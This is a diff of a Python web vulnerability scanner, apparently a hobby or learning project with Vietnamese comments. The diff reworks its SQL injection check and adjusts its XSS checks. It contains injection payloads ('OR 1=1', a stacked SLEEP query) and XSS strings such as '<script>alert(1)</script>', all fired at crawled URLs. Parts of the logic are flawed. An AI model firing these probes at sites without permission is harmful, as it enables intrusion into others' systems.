@@ -46,26 +46,40 @@ def crawl(url):
     return urls
 
 # Hàm kiểm tra SQL injection
-def check_sqli(url, resp1):
-  test_urls = [f"{url}' OR '1'='1", f"{url}' AND '1'='2"]
-  
+def check_sqli(url, response):
+  orig_resp = requests.get(url)
+  orig_status = orig_resp.status_code
+  orig_headers = orig_resp.headers
+  orig_content = orig_resp.text
+  orig_time = orig_resp.elapsed.total_seconds()
+
+  test_urls = [
+    f"{url}' OR '1'='1", 
+    f"{url}' AND '1'='2",
+    f"{url}'; SELECT SLEEP(5); -- "
+  ]
+
   for test_url in test_urls:
-    resp1 = requests.get(test_url)  
-    if check_error(resp1):
-      print("Error based SQLi detected")
-      return True
+    print(url)
+    payload_resp = requests.get(test_url)
 
-  return False
+    if payload_resp.status_code != orig_status:
+      print("Different status code")
+      
+    if payload_resp.headers != orig_headers:
+      print("Different headers")
+      
+    if payload_resp.text != orig_content:
+      print("Different response content")
 
-def check_error(response):
-  # Kiểm tra nội dung lỗi 
-  if "SQL syntax" in response.text:
-    return True
-  # Kiểm tra time delay
-  if response.elapsed.total_seconds() > 1:  
-    return True
-    
-  return False
+    payload_time = payload_resp.elapsed.total_seconds()
+    if payload_time - orig_time > 4:
+      print("Time delay detected")
+
+    if "SQL syntax" in payload_resp.text:
+      print("Error message detected")
+
+  print("SQL injection scan completed")
 
 # -----------------------------------------------------------------------
 # Hàm kiểm tra XSS
@@ -82,8 +96,24 @@ html_payloads = [
   "<div id='<' onclick='alert(1)'>" 
 ]
 
+def detect_context(url, response):
+  # Phân tích URL và response để xác định context
+  response = requests.get(url)
+
+  # context = detect_context(url, response.text) 
+  
+  if url.find("?") > 0:
+    return "url_param" 
+  elif response.text.find("<script>") > 0:
+    return "html_tag"
+  elif response.text.find("onclick=") > 0:
+    return "attribute"
+
+  return None
 
 def check_xss(url, response):
+
+  payloads = []
 
   context = detect_context(url, response)
   
@@ -105,7 +135,7 @@ def check_xss(url, response):
         data[input.get('name')] = payload
         response = session.post(url + form['action'], data=data)
         if payload in response.text:
-          print('\nXSS in', url + form['action'])
+          print('\nChecking XSS in:', url + form['action'])
 
   # Check URL parameters
   params = re.findall(r'([^?=&]+)=([^&]*)', url)
@@ -114,39 +144,26 @@ def check_xss(url, response):
       url = url.replace(f'{name}={value}', f'{name}={payload}')
       response = session.get(url)
       if payload in response.text:
-        print('\nXSS in', url)
+        print('\nChecking XSS in:', url)
 
   for encoded_payload in encoded_payloads:
     url = f"{url}?q={encoded_payload}"
     response = requests.get(url)
     
     if encoded_payload in response.text:
-      print("\nBypass filter with encoded payload: ", url)
+      print("\nTrying bypass filter with encoded payload: ", url)
 
     normal_payload = "<script>alert(1)</script>"
     url = f"{url}?q={normal_payload}"
     response = requests.get(url)
 
     if normal_payload not in response.text:
-      print("\nSite filters special characters from URL: ", url)
+      print("\nChecking site filters special characters from URL: ", url)
 
 
   return False
 
-def detect_context(url, response):
-  # Phân tích URL và response để xác định context
-  response = requests.get(url)
 
-  # context = detect_context(url, response.text) 
-  
-  if url.find("?") > 0:
-    return "url_param" 
-  elif response.text.find("<script>") > 0:
-    return "html_tag"
-  elif response.text.find("onclick=") > 0:
-    return "attribute"
-
-  return None
 
 # -------------------------------------------------
 # Hàm kiểm tra LFI  
